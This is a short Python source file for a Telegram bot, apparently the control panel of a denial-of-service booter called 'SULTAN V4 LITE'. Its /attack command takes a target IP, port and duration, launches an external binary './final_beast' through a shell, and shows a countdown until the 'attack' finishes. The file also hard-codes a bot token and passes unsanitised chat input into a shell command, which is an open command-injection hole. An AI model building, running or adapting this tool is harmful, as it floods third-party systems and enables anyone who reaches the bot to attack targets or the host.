import telebot, subprocess, time, threading

TOKEN = "8586393188:AAF-zC6xKyiaLil7pd_0tEbooy9jYBAFxqA"
ADMIN_ID = 5961723105
bot = telebot.TeleBot(TOKEN)

def timer(chat_id, msg_id, target, dur):
    rem = int(dur)
    while rem > 0:
        try:
            if rem % 10 == 0 or rem <= 5:
                bot.edit_message_text(chat_id=chat_id, message_id=msg_id, 
                    text=f"🔱 **SULTAN V4 LITE (TERMUX)**\n🚀 Target: {target}\n⏳ Time Left: {rem}s")
            time.sleep(1); rem -= 1
        except: break
    bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="✅ **ATTACK FINISHED**")

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "🔱 **SULTAN AI V4 ONLINE** 🔱\n🚀 `/attack <IP> <PORT> <TIME>`")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    args = message.text.split()
    if len(args) < 4: return
    ip, port, dur = args[1], args[2], args[3]
    msg = bot.send_message(message.chat.id, "🛰️ **ATTACK STARTING...**")
    subprocess.Popen(f"./final_beast {ip} {port} {dur}", shell=True)
    threading.Thread(target=timer, args=(message.chat.id, msg.message_id, ip, dur)).start()

print("✅ Sultan Lite is starting...")
bot.polling(none_stop=True)
